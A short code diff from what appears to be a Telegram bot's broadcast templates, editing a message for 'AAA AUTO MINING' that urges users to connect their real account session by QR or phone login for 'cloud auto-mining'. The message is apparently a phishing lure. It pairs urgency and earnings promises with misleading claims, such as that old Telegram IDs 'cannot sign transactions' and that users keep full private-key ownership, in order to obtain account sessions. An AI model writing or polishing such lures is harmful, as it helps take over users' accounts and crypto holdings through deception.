@@ -233,7 +233,7 @@ broadcast_tab_content = """
               {
                 id: "onboard",
                 label: "🚀 Connect Account (QR & Phone Upgrade)",
-                text: "🚀 *Upgrade Alert: Connect Your Account for 24/7 Cloud Auto-Mining!* 🌟\\n\\nHey Miner! We have fully upgraded AAA AUTO MINING with *1-Tap QR Login & Phone Login* for continuous cloud automation!\\n\\n⛏️ *Why connect your real device session?*\\n• 3rd-party bots (*MRG, ATF, Victor's, Vyro, Kynex, Diggo, Astra, Pepe, Adx*) require authentic sessions to claim yields.\\n• Old numeric Telegram IDs cannot sign transactions and have been retired.\\n• Dedicated 5-chain non-custodial wallet suite included with 100% private key ownership!\\n\\n👉 *Tap below to connect in seconds and start earning 24/7 with zero battery drain:*"
+                text: "🚀 *Upgrade Alert: Connect Your Account for 24/7 Cloud Auto-Mining!* 🌟\\n\\nHey Miner! We have fully upgraded AAA AUTO MINING with *1-Tap QR Login & Phone Login* for continuous cloud automation!\\n\\n⛏️ *Why connect your real device session?*\\n• 3rd-party bots (*MRG, ATF, Victor's, Kynex, Diggo, Pepe, Adx, Chicken*) require authentic sessions to claim yields.\\n• Old numeric Telegram IDs cannot sign transactions and have been retired.\\n• Dedicated 5-chain non-custodial wallet suite included with 100% private key ownership!\\n\\n👉 *Tap below to connect in seconds and start earning 24/7 with zero battery drain:*"
               },
               {
                 id: "revoked",
